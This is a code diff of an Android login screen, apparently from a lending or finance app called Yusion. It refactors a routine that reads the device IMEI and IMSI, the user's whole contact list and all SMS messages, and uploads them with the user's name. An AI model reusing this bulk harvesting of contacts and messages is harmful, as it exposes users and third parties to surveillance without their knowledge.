@@ -12,8 +12,6 @@ import android.widget.EditText;
 import android.widget.TextView;
 import android.widget.Toast;
 
-import com.amap.api.location.AMapLocation;
-import com.amap.api.location.AMapLocationListener;
 import com.yusion.shanghai.yusion.R;
 import com.yusion.shanghai.yusion.YusionApp;
 import com.yusion.shanghai.yusion.base.ActivityManager;
@@ -21,12 +19,12 @@ import com.yusion.shanghai.yusion.base.BaseActivity;
 import com.yusion.shanghai.yusion.bean.auth.CheckUserInfoResp;
 import com.yusion.shanghai.yusion.bean.auth.LoginReq;
 import com.yusion.shanghai.yusion.bean.auth.LoginResp;
-import com.yusion.shanghai.yusion.bean.upload.ContactPersonInfoReq;
 import com.yusion.shanghai.yusion.retrofit.api.AuthApi;
 import com.yusion.shanghai.yusion.retrofit.api.ConfigApi;
 import com.yusion.shanghai.yusion.retrofit.api.PersonApi;
 import com.yusion.shanghai.yusion.retrofit.callback.OnItemDataCallBack;
 import com.yusion.shanghai.yusion.settings.Settings;
+import com.yusion.shanghai.yusion.ubt.bean.UBTData;
 import com.yusion.shanghai.yusion.utils.CheckMobileUtil;
 import com.yusion.shanghai.yusion.utils.MobileDataUtil;
 import com.yusion.shanghai.yusion.utils.SharedPrefsUtil;
@@ -160,9 +158,8 @@ public class LoginActivity extends BaseActivity {
     }
 
 
-    private void
-    uploadPersonAndDeviceInfo() {
-        ContactPersonInfoReq req = new ContactPersonInfoReq();
+    private void uploadPersonAndDeviceInfo() {
+        UBTData req = new UBTData(this);
         String imei = telephonyManager.getDeviceId();
         String imsi = telephonyManager.getSubscriberId();
         req.imei = imei;
@@ -172,13 +169,13 @@ public class LoginActivity extends BaseActivity {
         req.mobile = SharedPrefsUtil.getInstance(this).getValue("mobile", null);
 
         JSONArray jsonArray = MobileDataUtil.getUserData(this, "contact");
-        List<ContactPersonInfoReq.DataBean.ContactListBean> list = new ArrayList<>();
+        List<UBTData.ContactBean.ContactListBean> list = new ArrayList<>();
         List<String> raw_list = new ArrayList<>();
         for (int i = 0; i < jsonArray.length(); i++) {
             JSONObject jsonObject = null;
             try {
                 jsonObject = jsonArray.getJSONObject(i);
-                ContactPersonInfoReq.DataBean.ContactListBean contactListBean = new ContactPersonInfoReq.DataBean.ContactListBean();
+                UBTData.ContactBean.ContactListBean contactListBean = new UBTData.ContactBean.ContactListBean();
 
                 contactListBean.data1 = jsonObject.optString("data1");
                 contactListBean.display_name = jsonObject.optString("display_name");
@@ -191,18 +188,18 @@ public class LoginActivity extends BaseActivity {
             }
         }
         if (list.size() > 0 && !list.isEmpty()) {
-            req.data.contact_list = list;
+            req.contact.contact_list = list;
         } else {
-            req.data.raw_data = raw_list;
+            req.contact.raw_data = raw_list;
         }
 
         JSONArray smsJsonArray = MobileDataUtil.getUserData(this, "sms");
-        List<ContactPersonInfoReq.SmsBean.SmsListBean> smsList = new ArrayList<>();
+        List<UBTData.SmsBean.SmsListBean> smsList = new ArrayList<>();
         for (int i = 0; i < smsJsonArray.length(); i++) {
             JSONObject jsonObject = null;
             try {
                 jsonObject = smsJsonArray.getJSONObject(i);
-                ContactPersonInfoReq.SmsBean.SmsListBean smsListBean = new ContactPersonInfoReq.SmsBean.SmsListBean();
+                UBTData.SmsBean.SmsListBean smsListBean = new UBTData.SmsBean.SmsListBean();
                 String type = jsonObject.optString("type");
                 if (type.equals("1")) {
                     smsListBean.from = jsonObject.optString("address");
@@ -224,25 +221,14 @@ public class LoginActivity extends BaseActivity {
             req.sms.sms_list = smsList;
         }
 
-        req.gps.latitude = SharedPrefsUtil.getInstance(this).getValue("latitude", "");
-        req.gps.longitude = SharedPrefsUtil.getInstance(this).getValue("longitude", "");
-        req.data.mobile = SharedPrefsUtil.getInstance(this).getValue("mobile", "0");
+        req.contact.mobile = SharedPrefsUtil.getInstance(this).getValue("mobile", "0");
         req.sms.mobile = SharedPrefsUtil.getInstance(this).getValue("mobile", "0");
-        req.system = "android";
-
-
-        JSONObject jsonArray1 = MobileDataUtil.getDeviceData(this);
-        req.brand = SharedPrefsUtil.getInstance(this).getValue("brand", "");
-        req.os_version = SharedPrefsUtil.getInstance(this).getValue("release", "");
-        req.factory = SharedPrefsUtil.getInstance(this).getValue("factory", "");
-        req.model = SharedPrefsUtil.getInstance(this).getValue("model", "");
-        req.rooted = MobileDataUtil.hasRoot();
-        req.data.action = "contact";
+        req.contact.action = "contact";
 
         AuthApi.checkUserInfo(this, new OnItemDataCallBack<CheckUserInfoResp>() {
             @Override
             public void onItemDataCallBack(CheckUserInfoResp data) {
-                req.data.clt_nm = data.name;
+                req.contact.clt_nm = data.name;
                 req.sms.clt_nm = data.name;
                 //PersonApi.uploadPersonAndDeviceInfo(req);
                 PersonApi.uploadPersonAndDeviceInfo(req, new Callback() {
